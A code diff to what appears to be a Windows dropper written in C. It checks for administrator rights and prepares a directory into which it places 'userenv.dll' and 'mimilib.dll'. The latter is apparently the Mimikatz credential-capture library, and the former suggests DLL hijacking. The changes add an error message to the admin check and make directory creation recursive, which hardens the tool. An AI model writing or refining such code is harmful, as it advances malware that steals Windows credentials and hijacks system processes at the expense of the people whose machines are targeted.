@@ -3,14 +3,17 @@
 #include <conio.h>
 #include <tlhelp32.h>
 #include <urlmon.h>
+#include <shlobj.h>
 
 #pragma comment(lib, "urlmon.lib")
 
 BOOL WINAPI IsUserAnAdmin(void);
 
 int main(void) {
-    if (!IsUserAnAdmin())
+    if (!IsUserAnAdmin()) {
+        printf("[-] Not running as admin.\n");
         return 1;
+    }
 
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, MAX_PATH);
@@ -61,9 +64,12 @@ int main(void) {
     wsprintfA(targetUserenv, "%s\\userenv.dll", targetDir);
     wsprintfA(targetMimilib, "%s\\mimilib.dll", targetDir);
 
-    if (!CreateDirectoryA(targetDir, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
-        printf("[-] Failed to create directory (%lu)\n", GetLastError());
-        return 1;
+    {  /* ponytail: SHCreateDirectoryExA creates intermediates recursively */
+        int hr = SHCreateDirectoryExA(NULL, targetDir, NULL);
+        if (hr != ERROR_SUCCESS && hr != ERROR_ALREADY_EXISTS) {
+            printf("[-] Failed to create directory (0x%lx)\n", hr);
+            return 1;
+        }
     }
     printf("[+] Directory created: %s\n", targetDir);
 
